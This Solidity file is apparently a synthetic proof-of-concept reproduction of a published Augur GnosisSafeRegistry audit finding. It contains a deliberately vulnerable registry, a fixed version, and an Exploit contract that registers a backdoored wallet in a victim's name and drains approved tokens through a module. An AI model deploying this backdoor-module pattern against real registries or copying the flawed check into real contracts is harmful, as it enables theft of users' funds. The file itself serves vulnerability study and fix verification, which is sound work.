// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Augur GnosisSafeRegistry — anyone can register a backdoored wallet
    (OpenZeppelin, Augur Core v2 components, C01, Feb 2020).
    SYNTHETIC, cheatcode-free reduction. Audited commit 67c0fec.
    register() stores msg.sender under owners[0] after checking only the
    proxy hash, the master copy, threshold == 1, and a single owner.
    It never checks modules and never checks that the owner authorized
    the wallet. A stranger deploys a compliant proxy, lists the victim
    as the sole owner, enables their own module, and register() records
    that proxy as the victim's safe. The victim approves the safe
    getSafe returns. The module then transferFroms N CASH.
    The fixed registry rejects any safe that still has a module, so the
    stranger cannot pull the victim's remaining N. */

interface IGnosisSafe {
    function getOwners() external view returns (address[] memory);
    function getThreshold() external view returns (uint256);
    function getModules() external view returns (address);
}

interface IProxy {
    function masterCopy() external view returns (address);
}

interface ISafeExec {
    function setup(address owner, address module) external;
    function execTransactionFromModule(address to, uint256 value, bytes calldata data) external returns (bool);
    function execTransaction(address to, bytes calldata data) external returns (bool);
    function getOwners() external view returns (address[] memory);
    function getThreshold() external view returns (uint256);
    function getModules() external view returns (address);
}

contract Cash {
    string public name = "Augur Cash";
    string public symbol = "CASH";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public minter;

    constructor() {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        allowance[from][msg.sender] = allowed - amount;
        uint256 bal = balanceOf[from];
        require(bal >= amount, "balance");
        balanceOf[from] = bal - amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Proxy {
    address public masterCopy;

    constructor(address _masterCopy) {
        masterCopy = _masterCopy;
    }

    fallback() external payable {
        address impl = masterCopy;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

contract GnosisSafeMaster {
    address public masterCopy;
    address[] private ownerList;
    uint256 private _threshold;
    mapping(address => bool) public isModule;
    address public enabledModule;

    function setup(address owner, address module) external {
        require(ownerList.length == 0, "setup");
        ownerList.push(owner);
        _threshold = 1;
        if (module != address(0)) {
            isModule[module] = true;
            enabledModule = module;
        }
    }

    function getOwners() external view returns (address[] memory) {
        return ownerList;
    }

    function getThreshold() external view returns (uint256) {
        return _threshold;
    }

    function getModules() external view returns (address) {
        return enabledModule;
    }

    function execTransactionFromModule(address to, uint256 value, bytes calldata data) external returns (bool success) {
        require(isModule[msg.sender], "not module");
        (success,) = to.call{value: value}(data);
        require(success, "module call failed");
    }

    function execTransaction(address to, bytes calldata data) external returns (bool success) {
        require(ownerList.length == 1, "owners");
        require(msg.sender == ownerList[0], "only owner");
        (success,) = to.call(data);
        require(success, "owner call failed");
    }
}

contract GnosisSafeRegistry {
    mapping(address => IGnosisSafe[]) public accountSafes;
    mapping(address => uint256) public accountSafeIndexes;
    bytes32 public proxyCodeHash;
    address public gnosisSafeMasterCopy;
    event SafeRecorded(address indexed owner, address safe);

    function initialize(address _master, bytes32 _proxyCodeHash) external {
        require(gnosisSafeMasterCopy == address(0), "init");
        gnosisSafeMasterCopy = _master;
        proxyCodeHash = _proxyCodeHash;
    }

    function register() external {
        IGnosisSafe _safe = getAndValidateSafeFromSender();
        address[] memory _owners = _safe.getOwners();
        address _owner = _owners[0];
        // External self-call so viaIR keeps a source map on the storage write.
        this.recordOwnerSafe(_owner, _safe);
    }

    function recordOwnerSafe(address _owner, IGnosisSafe _safe) external {
        require(msg.sender == address(this), "record");
        // @> VULN: stores this safe under owners[0] with no module check and no proof the owner authorized the wallet
        emit SafeRecorded(_owner, address(_safe)); accountSafes[_owner].push(_safe);
    }

    function getAndValidateSafeFromSender() internal view returns (IGnosisSafe) {
        IGnosisSafe _safe = IGnosisSafe(msg.sender);
        bytes32 _codeHash;
        assembly {
            _codeHash := extcodehash(_safe)
        }
        require(_codeHash == proxyCodeHash, "Safe instance does not match expected code hash of the Proxy contract");
        require(IProxy(msg.sender).masterCopy() == gnosisSafeMasterCopy, "Proxy master contract is not the Gnosis Safe");
        require(_safe.getThreshold() == 1, "Safe may only have a threshold of 1");
        address[] memory _owners = _safe.getOwners();
        require(_owners.length == 1, "Safe may only have 1 user");
        return _safe;
    }

    function getSafe(address _account) public view returns (IGnosisSafe) {
        uint256 accountSafeIndex = accountSafeIndexes[_account];
        if (accountSafes[_account].length < accountSafeIndex + 1) {
            return IGnosisSafe(address(0));
        }
        return accountSafes[_account][accountSafeIndex];
    }
}

contract FixedRegistry {
    mapping(address => IGnosisSafe[]) public accountSafes;
    mapping(address => uint256) public accountSafeIndexes;
    bytes32 public proxyCodeHash;
    address public gnosisSafeMasterCopy;

    function initialize(address _master, bytes32 _proxyCodeHash) external {
        require(gnosisSafeMasterCopy == address(0), "init");
        gnosisSafeMasterCopy = _master;
        proxyCodeHash = _proxyCodeHash;
    }

    function register() external {
        IGnosisSafe _safe = getAndValidateSafeFromSender();
        require(_safe.getModules() == address(0), "Safe has a module");
        address[] memory _owners = _safe.getOwners();
        address _owner = _owners[0];
        accountSafes[_owner].push(_safe);
    }

    function getAndValidateSafeFromSender() internal view returns (IGnosisSafe) {
        IGnosisSafe _safe = IGnosisSafe(msg.sender);
        bytes32 _codeHash;
        assembly {
            _codeHash := extcodehash(_safe)
        }
        require(_codeHash == proxyCodeHash, "Safe instance does not match expected code hash of the Proxy contract");
        require(IProxy(msg.sender).masterCopy() == gnosisSafeMasterCopy, "Proxy master contract is not the Gnosis Safe");
        require(_safe.getThreshold() == 1, "Safe may only have a threshold of 1");
        address[] memory _owners = _safe.getOwners();
        require(_owners.length == 1, "Safe may only have 1 user");
        return _safe;
    }

    function getSafe(address _account) public view returns (IGnosisSafe) {
        uint256 accountSafeIndex = accountSafeIndexes[_account];
        if (accountSafes[_account].length < accountSafeIndex + 1) {
            return IGnosisSafe(address(0));
        }
        return accountSafes[_account][accountSafeIndex];
    }
}

contract Victim {
    function approveRegistered(address registry, address token, uint256 amount) external {
        address safe = address(GnosisSafeRegistry(registry).getSafe(address(this)));
        require(safe != address(0), "no safe");
        Cash(token).approve(safe, amount);
    }

    function registerOwn(address safe, address registry) external {
        ISafeExec(safe).execTransaction(registry, abi.encodeWithSignature("register()"));
    }
}

contract BackdoorModule {
    function registerWallet(address safe, address registry_) external {
        ISafeExec(safe).execTransactionFromModule(registry_, 0, abi.encodeWithSignature("register()"));
    }

    function spend(address safe, address token, address from, address to, uint256 amount) external {
        ISafeExec(safe).execTransactionFromModule(
            token, 0, abi.encodeWithSignature("transferFrom(address,address,uint256)", from, to, amount)
        );
    }

    function tryRegister(address safe, address registry_) external returns (bool) {
        try ISafeExec(safe).execTransactionFromModule(registry_, 0, abi.encodeWithSignature("register()")) returns (
            bool
        ) {
            return true;
        } catch {
            return false;
        }
    }

    function trySpend(address safe, address token, address from, address to, uint256 amount) external returns (bool) {
        try ISafeExec(safe).execTransactionFromModule(
            token, 0, abi.encodeWithSignature("transferFrom(address,address,uint256)", from, to, amount)
        ) returns (bool) {
            return true;
        } catch {
            return false;
        }
    }
}

contract Exploit {
    uint256 public constant N = 1000 ether;

    Cash public cash;
    GnosisSafeMaster public master;
    GnosisSafeRegistry public registry;
    FixedRegistry public fixedReg;
    Victim public victim;
    BackdoorModule public module;
    Proxy public backdoor;
    Proxy public clean;

    address public listed;
    address public queuedReal;
    address public controlListed;
    uint256 public stolen;
    uint256 public victimLeft;
    uint256 public backdoorAllowance;
    uint256 public controlAllowance;
    bool public realWalletNotCurrent;
    bool public fixedRejected;
    bool public controlSpendFailed;

    constructor() {
        cash = new Cash();
        master = new GnosisSafeMaster();
        registry = new GnosisSafeRegistry();
        fixedReg = new FixedRegistry();
        victim = new Victim();
        module = new BackdoorModule();
        bytes32 codeHash = keccak256(type(Proxy).runtimeCode);
        registry.initialize(address(master), codeHash);
        fixedReg.initialize(address(master), codeHash);
        cash.mint(address(victim), 2 * N);
    }

    function run() external {
        backdoor = new Proxy(address(master));
        ISafeExec(address(backdoor)).setup(address(victim), address(module));
        require(IProxy(address(backdoor)).masterCopy() == address(master), "master");
        require(ISafeExec(address(backdoor)).getOwners()[0] == address(victim), "owner");
        require(ISafeExec(address(backdoor)).getThreshold() == 1, "threshold");
        require(ISafeExec(address(backdoor)).getModules() == address(module), "module");
        require(keccak256(address(backdoor).code) == registry.proxyCodeHash(), "codehash");
        module.registerWallet(address(backdoor), address(registry));
        listed = address(registry.getSafe(address(victim)));
        require(listed == address(backdoor), "not listed");
        victim.approveRegistered(address(registry), address(cash), N);
        module.spend(address(backdoor), address(cash), address(victim), address(module), N);
        stolen = cash.balanceOf(address(module));
        require(stolen == N, "stolen");
        clean = new Proxy(address(master));
        ISafeExec(address(clean)).setup(address(victim), address(0));
        victim.registerOwn(address(clean), address(registry));
        queuedReal = address(registry.accountSafes(address(victim), 1));
        require(queuedReal == address(clean), "queued");
        realWalletNotCurrent = address(registry.getSafe(address(victim))) == address(backdoor);
        require(realWalletNotCurrent, "real wallet became current");
        fixedRejected = !module.tryRegister(address(backdoor), address(fixedReg));
        require(fixedRejected, "fixed accepted");
        victim.registerOwn(address(clean), address(fixedReg));
        controlListed = address(fixedReg.getSafe(address(victim)));
        require(controlListed == address(clean), "control listed");
        victim.approveRegistered(address(fixedReg), address(cash), N);
        controlSpendFailed = !module.trySpend(address(clean), address(cash), address(victim), address(module), N);
        require(controlSpendFailed, "control spent");
        victimLeft = cash.balanceOf(address(victim));
        backdoorAllowance = cash.allowance(address(victim), address(backdoor));
        controlAllowance = cash.allowance(address(victim), address(clean));
        require(victimLeft == N, "victim left");
        require(backdoorAllowance == 0, "backdoor allowance");
        require(controlAllowance == N, "control allowance");
    }
}
